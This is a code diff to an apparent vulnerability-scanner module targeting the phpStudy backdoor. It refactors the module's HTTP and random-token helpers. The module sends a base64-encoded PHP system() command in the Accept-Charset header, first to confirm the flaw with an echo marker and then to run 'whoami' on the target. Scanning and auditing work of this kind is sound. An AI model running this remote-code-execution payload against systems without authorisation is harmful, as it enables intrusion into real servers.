@@ -2,17 +2,13 @@
 
 import re
 import base64
-import string
-import random
-import requests
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class Phpstudy_Backdoor_Rce_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta = '' 
-        words = ''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words) 
+        self.capta = get_capta()
         self.headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
@@ -30,7 +26,7 @@ class Phpstudy_Backdoor_Rce_BaseVerify:
         command = "system(\"" + 'echo %swin^dowslin$1ux' %(self.capta) + "\");"
         command = base64encode(command)
         self.headers['Accept-Charset'] = command
-        req = requests.get(self.url, headers = self.headers)
+        req = request.get(self.url, headers = self.headers)
         if self.capta in req.text:
             return True
             #print 'Target is vulnerable!!!' + '\n'
@@ -50,7 +46,7 @@ class Phpstudy_Backdoor_Rce_BaseVerify:
                 command = "system(\"" + 'whoami' + "\");"
                 command = base64encode(command)
                 self.headers['Accept-Charset'] = command
-                req = requests.get(self.url, headers = self.headers)
+                req = request.get(self.url, headers = self.headers)
                 cmd_result = req.text.split('<!')[0]
                 # print(cmd_result)
                 return True
